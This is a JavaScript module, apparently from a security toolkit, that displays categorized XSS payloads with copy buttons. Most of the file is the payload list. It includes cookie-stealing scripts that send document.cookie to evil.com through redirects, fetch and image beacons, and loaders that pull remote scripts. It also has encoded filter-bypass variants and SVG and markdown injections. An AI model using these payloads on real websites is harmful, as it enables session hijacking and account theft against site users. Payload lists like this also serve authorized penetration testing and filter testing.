const categories = {
  'Data Grabber': [
    '<script>document.location=\'http://evil.com/steal.php?c=\'+document.cookie</script>',
    '<script>fetch(\'http://evil.com/steal?c=\'+document.cookie)</script>',
    '<script>new Image().src=\'http://evil.com/steal.php?c=\'+document.cookie;</script>',
    '<script>var i=new Image();i.src="http://evil.com/steal.php?c="+btoa(document.cookie)</script>',
    '<script>$.getScript("http://evil.com/hook.js")</script>',
  ],
  'Basic XSS': [
    '<script>alert(1)</script>',
    '<script>confirm(1)</script>',
    '<script>prompt(1)</script>',
    '<script>alert(document.cookie)</script>',
    '<script>alert(document.domain)</script>',
    '<script>document.write("XSS")</script>',
    '<ScRiPt>alert(1)</ScRiPt>',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    'javascript:alert(1)',
    '"><script>alert(1)</script>',
    '\'><script>alert(1)</script>',
    '></script><script>alert(1)</script>',
  ],
  'Img Payloads': [
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert(document.cookie)>',
    '<img src=x onerror=fetch(\'http://evil.com/\'+document.cookie)>',
    '<img src=x onerror="new Image().src=\'http://evil.com/steal.php?c=\'+document.cookie">',
    '<img src=x onerror=eval(atob(\'YWxlcnQoMSk=\'))>',
    '<img src=x onerror=confirm(1)>',
    '<img src=x onerror=prompt(1)>',
    '<img src=x onerror="with(document)body.appendChild(createElement(\'script\')).src=\'http://evil.com/xss.js\'">',
    '<image src=x onerror=alert(1)>',
    '<body onload=alert(1)>',
  ],
  'Markdown XSS': [
    '[Click me](javascript:alert(1))',
    '![XSS](x onerror=alert(1))',
    '<img src=x onerror=alert(1)>',
    '[XSS](http://evil.com/xss.js)',
    '<script>alert(1)</script>',
  ],
  'SVG XSS': [
    '<svg onload=alert(1)>',
    '<svg onload=alert(document.cookie)>',
    '<svg/onload=alert(1)>',
    '<svg onload=fetch(\'http://evil.com/?c=\'+document.cookie)>',
    '<svg><script>alert(1)</script></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>',
    '<svg><animate onbegin=alert(1) attributeName=x></svg>',
  ],
  'Bypass': [
    '<script>eval(atob(\'YWxlcnQoMSk=\'))</script>',
    '<script>eval(\'\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\')</script>',
    '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<a/href=javascript:alert(1)>click</a>',
    '<details/open/ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>',
    '<isindex type=image src=1 onerror=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '"><svg/onload=alert(1)>',
    '\'><svg/onload=alert(1)>',
    '<iframe srcdoc="<script>alert(1)</script>">',
    '<!--><script>alert(1)</script>-->',
    '<?xml version="1.0"?><script>alert(1)</script>',
  ],
};

function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

export default function render(lang) {
  const isFa = lang === 'fa';
  const cats = Object.keys(categories);
  return `
<div class="section-title">${isFa ? 'پیلودهای XSS' : 'XSS Payloads'}</div>
<div class="tabs" id="xss-tabs">
  ${cats.map((c, i) => `<button class="tab${i === 0 ? ' active' : ''}" data-tab="xss-${i}">${c}</button>`).join('')}
</div>
${cats.map((c, i) => `
<div class="tab-pane${i === 0 ? ' active' : ''}" id="xss-${i}">
  ${categories[c].map(p => `
  <div class="panel" style="padding:12px;margin-bottom:8px;display:flex;align-items:center;gap:10px">
    <pre style="flex:1;margin:0;overflow:auto"><code>${escapeHtml(p)}</code></pre>
    <button class="secondary-btn" data-copy="${escapeHtml(p)}" style="flex-shrink:0">${isFa ? 'کپی' : 'Copy'}</button>
  </div>`).join('')}
</div>`).join('')}`;
}

export function init(lang) {
  const container = document.getElementById('content');
  container.addEventListener('click', (e) => {
    const btn = e.target.closest('.secondary-btn');
    if (btn && btn.hasAttribute('data-copy')) {
      navigator.clipboard.writeText(btn.getAttribute('data-copy'));
    }
    const tab = e.target.closest('.tab');
    if (tab && tab.closest('#xss-tabs')) {
      container.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      container.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
      tab.classList.add('active');
      const pane = document.getElementById(tab.getAttribute('data-tab'));
      if (pane) pane.classList.add('active');
    }
  });
}
